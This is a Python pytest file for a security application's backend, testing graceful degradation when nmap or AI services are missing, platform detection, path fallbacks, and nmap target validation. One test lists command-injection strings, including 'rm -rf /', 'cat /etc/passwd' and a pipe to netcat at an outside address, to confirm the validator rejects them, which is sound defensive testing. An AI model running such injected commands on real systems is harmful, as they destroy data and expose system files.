"""Tests for degraded-mode and optional-provider behavior.

These tests protect against regressions where missing optional dependencies
(nmap, ClamAV, VMware, Groq API key) cause crashes instead of graceful
fallback with clear diagnostics.
"""

from __future__ import annotations

import sys
import types
from unittest import mock

import pytest


# ---------------------------------------------------------------------------
# Integration availability helpers
# ---------------------------------------------------------------------------


class TestIntegrationStatus:
    """get_integration_status() must never raise regardless of environment."""

    def test_returns_dict_with_nmap_key(self):
        from backend.infra.integrations import get_integration_status

        status = get_integration_status()
        assert isinstance(status, dict)
        assert "nmap" in status

    def test_nmap_value_is_bool(self):
        from backend.infra.integrations import get_integration_status

        status = get_integration_status()
        assert isinstance(status["nmap"], bool)

    def test_nmap_false_when_not_in_path(self):
        from backend.infra import integrations

        with mock.patch("shutil.which", return_value=None):
            assert integrations.nmap_available() is False

    def test_nmap_true_when_in_path(self):
        from backend.infra import integrations

        with mock.patch("shutil.which", return_value="/usr/bin/nmap"):
            assert integrations.nmap_available() is True

    def test_print_integration_status_does_not_raise(self):
        from backend.infra.integrations import print_integration_status

        with mock.patch("shutil.which", return_value=None):
            # Must not raise regardless of nmap availability
            print_integration_status()


# ---------------------------------------------------------------------------
# DI container — degraded state (AI services unavailable)
# ---------------------------------------------------------------------------


class TestContainerDegradedAI:
    """Container.configure() must not raise when AI imports fail."""

    def test_configure_succeeds_without_groq_key(self, monkeypatch):
        """configure() must not raise even when Groq key is absent."""
        # Simulate missing GROQ_API_KEY
        monkeypatch.delenv("GROQ_API_KEY", raising=False)

        # configure() is safe to call multiple times; it just re-registers
        from backend.core.container import configure

        # Should not raise
        configure()

    def test_configure_survives_import_error_in_ai_module(self, monkeypatch):
        """configure() must degrade gracefully when AI modules cannot import."""
        import backend.core.container as container_mod

        original_configure = container_mod.configure

        # Patch the AI import block to raise ImportError
        original_import = __builtins__.__import__ if hasattr(__builtins__, "__import__") else __import__

        def _failing_import(name, *args, **kwargs):
            if "event_explainer_v5" in name or "security_chatbot" in name:
                raise ImportError(f"Simulated missing AI dependency: {name}")
            return original_import(name, *args, **kwargs)

        # We verify container.configure() doesn't re-raise on AI failure
        # by checking the try/except in its body works correctly.
        # Direct import test:
        try:
            from backend.engines.ai.event_explainer_v5 import get_event_explainer_v5  # noqa: F401
            ai_importable = True
        except ImportError:
            ai_importable = False

        # Whether importable or not, configure() must not raise
        configure = container_mod.configure
        configure()  # must succeed


# ---------------------------------------------------------------------------
# Platform branching
# ---------------------------------------------------------------------------


class TestPlatformBranching:
    """IS_WINDOWS / IS_LINUX must be mutually exclusive and consistent."""

    def test_exactly_one_platform_flag_is_true(self):
        from backend.platform import IS_WINDOWS, IS_LINUX

        # On a real OS one of them should be True (or both False on macOS)
        # — but they must never both be True
        assert not (IS_WINDOWS and IS_LINUX), "IS_WINDOWS and IS_LINUX cannot both be True"

    def test_get_platform_name_returns_known_string(self):
        from backend.platform import get_platform_name

        name = get_platform_name()
        assert name in ("windows", "linux", "unknown")

    def test_subprocess_create_no_window_exists_on_all_platforms(self):
        """The compatibility shim must ensure CREATE_NO_WINDOW is always defined."""
        import subprocess

        # After the shim runs, this attribute must exist on every platform
        assert hasattr(subprocess, "CREATE_NO_WINDOW")
        # On Linux the shim sets it to 0; on Windows it's the real value
        assert isinstance(subprocess.CREATE_NO_WINDOW, int)


# ---------------------------------------------------------------------------
# NmapCli — graceful failure when nmap is absent
# ---------------------------------------------------------------------------


class TestNmapCliDegradedState:
    """NmapCli must raise ExternalToolMissing when nmap is not installed."""

    def test_raises_external_tool_missing_when_nmap_absent(self, monkeypatch):
        from backend.core.errors import ExternalToolMissing

        # Make settings.offline_only False and nmap_path empty
        fake_settings = mock.MagicMock()
        fake_settings.offline_only = False
        fake_settings.nmap_path = ""

        with mock.patch("backend.infra.nmap_cli.get_settings", return_value=fake_settings):
            with mock.patch("backend.infra.nmap_cli.NmapCli._find_nmap", return_value=""):
                with pytest.raises(ExternalToolMissing):
                    from backend.infra.nmap_cli import NmapCli
                    NmapCli()

    def test_raises_integration_disabled_in_offline_mode(self, monkeypatch):
        from backend.core.errors import IntegrationDisabled

        fake_settings = mock.MagicMock()
        fake_settings.offline_only = True

        with mock.patch("backend.infra.nmap_cli.get_settings", return_value=fake_settings):
            with pytest.raises(IntegrationDisabled):
                from backend.infra.nmap_cli import NmapCli
                NmapCli()

    def test_validate_target_rejects_shell_metacharacters(self):
        """validate_target must block command injection attempts."""
        from backend.infra.nmap_cli import NmapCli

        dangerous_targets = [
            "192.168.1.1; rm -rf /",
            "host && cat /etc/passwd",
            "target | nc 1.2.3.4 4444",
            "$(whoami)",
            "`id`",
        ]
        for target in dangerous_targets:
            valid, _ = NmapCli.validate_target(target)
            assert not valid, f"Should have rejected dangerous target: {target!r}"

    def test_validate_target_accepts_valid_inputs(self):
        from backend.infra.nmap_cli import NmapCli

        valid_targets = [
            "192.168.1.1",
            "10.0.0.0/24",
            "hostname.local",
            "example.com",
        ]
        for target in valid_targets:
            valid, err = NmapCli.validate_target(target)
            assert valid, f"Should have accepted {target!r}: {err}"


# ---------------------------------------------------------------------------
# Path resolution — stability under missing environment variables
# ---------------------------------------------------------------------------


class TestPathResolutionRobustness:
    """Path helpers must never crash on missing env vars."""

    def test_windows_paths_use_fallback_when_appdata_missing(self, tmp_path, monkeypatch):
        from backend.platform import paths as paths_mod

        monkeypatch.setattr(sys, "platform", "win32")
        monkeypatch.delenv("APPDATA", raising=False)
        monkeypatch.delenv("LOCALAPPDATA", raising=False)
        monkeypatch.delenv("PROGRAMDATA", raising=False)
        monkeypatch.setattr(paths_mod.Path, "home", staticmethod(lambda: tmp_path))

        paths_mod.get_app_paths.cache_clear()
        try:
            app_paths = paths_mod.get_app_paths()
            # Must return something usable
            assert app_paths.config_dir is not None
            assert app_paths.log_dir is not None
        except Exception as exc:
            pytest.fail(f"get_app_paths() raised unexpectedly: {exc}")
        finally:
            paths_mod.get_app_paths.cache_clear()

    def test_linux_paths_use_home_fallback_when_xdg_missing(self, tmp_path, monkeypatch):
        from backend.platform import paths as paths_mod

        monkeypatch.setattr(sys, "platform", "linux")
        monkeypatch.setattr(paths_mod.Path, "home", staticmethod(lambda: tmp_path))
        monkeypatch.delenv("XDG_CONFIG_HOME", raising=False)
        monkeypatch.delenv("XDG_DATA_HOME", raising=False)
        monkeypatch.delenv("XDG_CACHE_HOME", raising=False)
        monkeypatch.delenv("XDG_STATE_HOME", raising=False)

        paths_mod.get_app_paths.cache_clear()
        try:
            app_paths = paths_mod.get_app_paths()
            # XDG fallback: ~/.config/sentinel
            assert str(tmp_path) in str(app_paths.config_dir)
        except Exception as exc:
            pytest.fail(f"get_app_paths() raised on missing XDG vars: {exc}")
        finally:
            paths_mod.get_app_paths.cache_clear()
